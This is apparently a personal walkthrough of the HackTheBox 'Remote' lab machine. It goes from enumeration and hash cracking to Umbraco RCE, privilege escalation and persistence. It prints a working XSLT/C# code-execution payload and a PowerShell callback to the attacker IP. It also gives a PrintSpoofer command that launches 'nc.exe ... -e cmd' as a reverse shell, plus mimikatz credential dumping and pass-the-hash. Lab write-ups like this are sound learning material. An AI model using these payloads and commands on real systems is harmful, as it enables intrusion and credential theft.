## Name of box: - Remote {#name-of-box-remote}


## 1. Enumeration: {#1-dot-enumeration}


### NMAP-Scans: {#nmap-scans}


#### Basic Scan: {#basic-scan}

-   I do this simple scan just get a lay of the land:
    ```shell
    kali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans  2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh
    üïô 09:02:23 zsh ‚ùØ nmap $box -Pn -sT
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 09:02 BST
    Nmap scan report for 10.129.200.122
    Host is up (0.039s latency).

    445/tcp  open  microsoft-ds
    2049/tcp open  nfs

    Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
    ```

    -   We can see there is some low hanging fruit FTP, SMB, NFS &amp; HTTP we will enumerate these whilst we have a more intensive NMAP Scan run:


#### In-Depth Scan: {#in-depth-scan}

-   More in depth scan

### FTP 21 Enumeration: {#ftp-21-enumeration}

-   I connect but is shows there is no information in the share.
    -   {{< figure src="/ox-hugo/2024-09-08-090707_.png" >}}
-   Just to ensure I am not being crazy I try to download all files using `wget`.
    -   `wget -m --no-passive ftp://anonymous:anonymous@$box`
    -   {{< figure src="/ox-hugo/2024-09-08-092011_.png" >}}
    -   However, there is nothing in the FTP share so we can move on.


### SMB 445 Enumeration: {#smb-445-enumeration}

-   I check for null session &amp; guest account but these are both disabled for SMB:
    -   `netexec smb $box -u '' -p '' --shares`
    -   `netexec smb $box -u 'guest' -p '' --shares`
        -   {{< figure src="/ox-hugo/2024-09-08-091050_.png" >}}

    -   **Discoveries**:
        -   We can see the hose is Running Windows 10 or Server 2019 &amp; that SMB Signing is disabled (This would be great if we had more than one machine in the env as we could do a relay attack)

    -   There doesn't seem to be much else here, so let's move on.


### NFS 2049 Enumeration: {#nfs-2049-enumeration}

As NFS by default is very insecure (unless using kerberos you can only limit the source IP connections) we can mount the share locally.

-   **Create target folder to mount it to**:
    -   `mkdir target-NFS`

-   **Mount the share**:
    -   `sudo mount -t nfs $box:/ ./target-NFS -o nolock`

    -   {{< figure src="/ox-hugo/2024-09-08-093039_.png" >}}

-   **We find it has the** `site_backups` **folder**:
    -   {{< figure src="/ox-hugo/2024-09-08-093106_.png" >}}
    -   This could mean it has hard coded creds in it or other interesting things.


#### Log Files: {#log-files}

-   **Looking through the NFS share I find a** `Logs` **folder**:
    -   {{< figure src="/ox-hugo/2024-09-08-100244_.png" >}}

-   **Grepping through the files we see the following entry**:
    -   **Pasword information**:
        -   {{< figure src="/ox-hugo/2024-09-08-100328_.png" >}}
        -   So from this we can see that the site is running `Umbraco` &amp; that the password is 10 chars long as a minimum:

    -   **I then see these login attempts**:
        -   {{< figure src="/ox-hugo/2024-09-08-100504_.png" >}}
        -   We can see the valid admin user is `admin@htb.local` &amp; not `admin`


#### Enumerating The Version Number: {#enumerating-the-version-number}

-   After some hunting I found this page that tells us how to enumerate the version of Umbraco.
    -   <https://our.umbraco.com/forum/getting-started/installing-umbraco/15825-Umbraco-version-and-a-test-site>
-   {{< figure src="/ox-hugo/2024-09-08-104749_.png" >}}

-   I grep the `Web.Config` and find the version is `7.12.4`
    -   {{< figure src="/ox-hugo/2024-09-08-104820_.png" >}}

-   **I run a quick search on** `exploit-db` **and find the following authenticated exploit**:
    -   <https://www.exploit-db.com/exploits/49488>
    -   It is an authenticated exploit so we can safely assume that there will be some credentials somewhere, either in this share or on the site.
        -   I find the Admin Panel Login Page: <http://10.129.200.122/umbraco/#/login>


### The hunt for credentials: {#the-hunt-for-credentials}

-   **I find this file** `Umbraco.sdf` **in the** `App_Data` **directory**:
    -   {{< figure src="/ox-hugo/2024-09-08-115829_.png" >}}

<!--listend-->

-   I had never heard of this file but after some searching found the following:

    > What is an SDF file?
    > An SDF file contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft. It is designed for applications that run on mobile devices and desktops and contains the complete database contents, which may be up to 4GB in size.


##### Extracting Data from the `.sdf` file: {#extracting-data-from-the-dot-sdf-file}

-   Initially after-being unable to view the file locally I spun up a windows VM and tried to extract the data with this tool but it would not work for me (this was a rabbit hole that I spent alot of time on.):
    -   <https://github.com/christianhelle/sqlcequery>


##### Good Old Strings: {#good-old-strings}

-   **There be hashes in them thar** `.sdf` **files**:
    -   Eventually I just resorted to running "Strings" on the file and hoping for the best &amp; guess what, some lovely hashes were at the top!
        -   {{< figure src="/ox-hugo/2024-09-08-121704_.png" >}}


### Cracking the hashes: {#cracking-the-hashes}

-   **I run the admin hash through hashcat &amp; rockyou**:
    -   {{< figure src="/ox-hugo/2024-09-08-122201_.png" >}}

-   **It's SHA1 so cracked easily**:
    -   {{< figure src="/ox-hugo/2024-09-08-122130_.png" >}}


### HTTP Enumeration: {#http-enumeration}

-   Usually I would have done more here, but we have already gotten so far, that I did not have to do basic things like dir-busting just yet (we may come back here)


## 2. Foothold: {#2-dot-foothold}

-   I navigate to the Login Page &amp; the creds work: <http://10.129.200.122/umbraco/#/login>
-   **With our creds we now have access to the admin console**:
    -   {{< figure src="/ox-hugo/2024-09-08-122514_.png" >}}
    -   There doesn't seem to be much here in the way of information or a clear path to privesc.


### Getting RCE with public exploits: {#getting-rce-with-public-exploits}


#### Exploit 1: {#exploit-1}

-   I copy the public exploit here to my machine:
    -   <https://www.exploit-db.com/exploits/49488>

-   **I run it &amp; boom RCE**:
    -   {{< figure src="/ox-hugo/2024-09-08-163347_.png" >}}

-   After some playing I was only ever able to get single commands to run, I could not use things like `Invoke-WebRequest` etc to get a shell. I also tried to upload a `.bat` POC with a simple call back to a running webserver I had, but I couldn't even get that uploaded.

-   After looking at the source code further for the above exploit, I could see the following line:
    -   `# Based on: https://www.exploit-db.com/exploits/46153` so I had a look a that exploit:


#### Exploit 2: {#exploit-2}

-   The payload of this scrip has an `XSLT` (Extensible Stylesheet Language Transformations) script with an embedded `C#` script within it that executes `calc.exe` (the calculator).
    -   If you're unfamiliar launching `calc.exe` is a standard way to prove RCE on a machine.
        ```xml
        payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
        xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
        <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
        { string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
         proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
         proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
         proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
         </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
         </xsl:template> </xsl:stylesheet> ';
        ```

-   Let's break this down so we both understand it better:


#### Key Components of the Payload - Code Breakdown: {#key-components-of-the-payload-code-breakdown}

-   **XML Declaration**:
    ```xml
    '<?xml version="1.0"?>'
    ```

    -   Declares the XML version being used.

-   **XSLT Stylesheet Declaration**:
    ```xml
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
    ```

    -   This starts the XSLT stylesheet with necessary namespaces for the transformation.
    -   `xmlns:msxsl`:
        -   Allows the usage of Microsoft's XSLT extensions.
    -   `xmlns:csharp_user`:
        -   Custom namespace for the embedded `C#` script.

-   **Embedded C# Script**:
    ```xml
    <msxsl:script language="C#" implements-prefix="csharp_user">
    ```

    -   This embeds a `C#` script inside the XSLT.
    -   `language="C#"`:
        -   Specifies that the script is written in `C#`
    -   `implements-prefix="csharp_user"`:
        -   Links the script to the `csharp_user` namespace.

-   `C#` **Function to Execute Code**:
    ```csharp
    public string xml() {
        string cmd = "";
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "calc.exe";
        proc.StartInfo.Arguments = cmd;
        proc.StartInfo.UseShellExecute = true;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd();
        return output;
    }
    ```

    -   This function named `xml()` is designed to execute the `calc.exe` program:
        -   **Command Line Args**: `string cmd = "";` as we can see this allows us pass command line arguments to the program being called, it's empty as we do not need to pass args to `calc.exe`, but we can use this for later.
        -   **Process creation**: Uses the `System.Diagnostics.Process` class to launch an external process (`calc.exe`).
        -   **Define the process to launch**: `proc.StartInfo.FileName = "calc.exe"` defines calc.exe as the process to launch.
        -   **Shell behavior**: `UseShellExecute = false` ensures that the process doesn't require a shell to run.
        -   **Redirect Output**: `RedirectStandardOutput = true` captures the output (although `calc.exe` doesn't produce output in this context).
            **Return Output**: `return output;` The function finally returns the process output.

-   **XSLT Template**:
    ```xml
    <xsl:template match="/">
      <xsl:value-of select="csharp_user:xml()"/>
    </xsl:template>
    ```

    -   The XSLT template calls the `xml()` function from the `csharp_user` namespace.
    -   The template is applied to the root `(/)` of the XML document, which means it is executed as soon as the transformation is applied.

-   **Why does this work?**
    -   Clearly the program is not sanitizing input nor is it sandboxed which means we can execute arbitrary code.


#### POC Test: {#poc-test}

-   So instead of running calc.exe we need it to trigger a reverse shell via powershell.
    -   Let's run a POC to see if we can get this to work.
        ```csharp
          public string xml() {
              string cmd = "wget http://10.10.14.34/POC";
              System.Diagnostics.Process proc = new System.Diagnostics.Process();
              proc.StartInfo.FileName = "powershell.exe";
              proc.StartInfo.Arguments = cmd;
              proc.StartInfo.UseShellExecute = false;
              proc.StartInfo.RedirectStandardOutput = true;
              proc.Start();
              string output = proc.StandardOutput.ReadToEnd();
              return output;
          }
        ```
    -   This function named `xml()` is designed to execute the `calc.exe` program:
        -   **Command Line Args**: `string cmd = "wget http://10.10.14.34/POC";` this is the IP of my host as well as a fake dir `POC` that I want it to try to connect to.
        -   **Process creation**: Uses the `System.Diagnostics.Process` class to launch an external process (`calc.exe`).
        -   **Define the process to launch**: `proc.StartInfo.FileName = "powershell.exe"` defines PowerShell as the process to launch.
        -   **Shell behavior**: `UseShellExecute = false` ensures that the process doesn't require a shell to run.
        -   **Redirect Output**: `RedirectStandardOutput = true` captures the output (useful to redirect to us)
            **Return Output**: `return output;` The function finally returns the process output.

-   **Run the exploit &amp; get a hit**:
    -   {{< figure src="/ox-hugo/2024-09-09-084311_.png" >}}
    -   This proves it works as I get a connection.


#### Base64 Encoded PowerShell String: {#base64-encoded-powershell-string}

So as we have a connection we want to create a payload that we can trigger back to ourselves:

-   I navigate to <https://www.revshells.com/> and use the `PowerShell #3 (Base64)` option and generate a reverse shell back to myself.

-   I then place this in my script:
    -   {{< figure src="/ox-hugo/2024-09-09-085946_.png" >}}

-   **Start my listener &amp; trigger it &amp; Success!!!!**
    -   {{< figure src="/ox-hugo/2024-09-09-085722_.png" >}}


## 3. Privesc: {#3-dot-privesc}

-   Now we have a reverse-shell lets get to work

-   Immediately looking at the User's Privilege we have the "`SeImpersonatePrivilege`" which means potato exploits or printer exploits could be on the cards.
    -   {{< figure src="/ox-hugo/2024-09-09-090638_.png" >}}


### SeImpersonatePrivilege Explained: {#seimpersonateprivilege-explained}

-   [Potato Exploits](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) take advantage of these privileges.
-   A security privilege in Windows that allows a process to adopt the security context of another user, typically after that user has been authenticated.
-   Essential for scenarios where a service (like SQL Server or IIS) needs to perform operations on behalf of an authenticated user, particularly when accessing resources that require user-specific permissions.

-   **Impersonation with** `SeImpersonatePrivilege`:
    -   **Process Tokens Overview**:
        -   Every process has an associated token that represents the identity and privileges of the account that initiated the process.
        -   The token contains security information like user identity, group memberships, and associated privileges.
        -   This token is automatically assigned when the process starts, based on the account under which the process is running (e.g., a system account or a user account).

-   **Impersonation Using** `SeImpersonatePrivilege`:
    -   When a service impersonates a user, it temporarily uses the user's token to perform actions with the user's permissions.
        -   The service can access resources (like file shares) that the user is allowed to access.
        -   The privilege allows the process running the service to "borrow" the identity of another user securely.

-   **Summarized**: The token of each process defines what that process can do, based on the permissions of the account running it. `SeImpersonatePrivilege` allows services to use another user's token for performing tasks on their behalf.

-   **Usage Context**:
    -   In the context of SQL Server or IIS using Windows Authentication, `SeImpersonatePrivilege` enables these services to perform tasks under the security context of the connected user, ensuring that operations adhere to the principle of least privilege and respect user-specific access controls.


##### Example of Impersonate Privilege Working: {#example-of-impersonate-privilege-working}

-   **How Impersonation Works**:
    -   The client connects to the service using their credentials (via Windows Authentication).
    -   The service, upon needing to access other resources (like file shares), uses the client's identity instead of its own.
    -   This is possible because the service account is given a special privilege called "Impersonate a client after authentication".

-   **Simple Text-Based Diagram of Impersonation Mechanism Working**:
    ```md
    [Client]
        |
        | (1) Authenticates using Windows Auth
        v
    [Server (SQL/IIS)]
        |
        | (2) Needs to access other resources
        v
    [Impersonation Process]
        |
        | (3) Server adopts the client's identity
        v
    [Other Resources]
      (e.g., File Shares)
    ```

    1.  **Client to Server Authentication**: The client authenticates to the server using Windows authentication.
    2.  **Resource Request**: The server requires access to additional resources (like files).
    3.  **Impersonation**: The server impersonates the client's identity to gain the same permissions the client has.
    4.  **Access Resources**: The server, acting as the client, accesses external resources (file shares, etc.).


## 4. Ownership: {#4-dot-ownership}

1.  **I upload the PrintSpoofer exploit binary**:
    -   {{< figure src="/ox-hugo/2024-09-09-101932_.png" >}}
    -   **Source**: <https://github.com/itm4n/PrintSpoofer>

2.  **I upload my nc.exe binary**:
    -   {{< figure src="/ox-hugo/2024-09-09-101812_.png" >}}

3.  **I run the exploit**:
    -   `.\printspoofer.exe -c "C:\Users\Public\Desktop\nc.exe 10.10.14.34 8888 -e cmd"`

## 5. Persistence: {#5-dot-persistence}

-   **Now that we have access we want ensure we can retain it**:

-   **I transfer mimikatz to the box**:
    -   {{< figure src="/ox-hugo/2024-09-09-112109_.png" >}}

-   **I try and &amp; dump LSASS &amp; Kerberos tickets but it appears the LSASS process is protected which is standard on more updated systems**:
    -   {{< figure src="/ox-hugo/2024-09-09-122444_.png" >}}

-   **I dump the LSA (Local System Authorited secrets) secrets**:
    -   {{< figure src="/ox-hugo/2024-09-09-113900_.png" >}}
    -   I find a Default weak Password for accounts:

-   **I also dump the SAM secrets**:
    -   I get the `Administrator` Hash and Kerberoros information for `REMOTEAdministrator`
    -   {{< figure src="/ox-hugo/2024-09-09-114202_.png" >}}

-   **I verify the Administrator hash works using netexec**:
    -   {{< figure src="/ox-hugo/2024-09-09-114403_.png" >}}

-   **As Win-Rm is running 5985,5986 I verify I can re-login using the Admin hash using a PTH (pass the hash attack)**
    -   {{< figure src="/ox-hugo/2024-09-09-114538_.png" >}}

-   We now have persistence.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned more about `C#` and creating a reverse shell via xml.
2.  I actually learned more about mimikatz (I just use the tool but I never actually sit and think about what is going on under the hood. I finally did and will expanding my notes &amp; sharing them.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I spent 10 mins resetting the host as I was using the wrong username, this is why I usually always work from vars, but didn't decided to manually type it in!!!
2.  Oh for some reason I used the wrong IP to connect back to myself on, triple check!!!
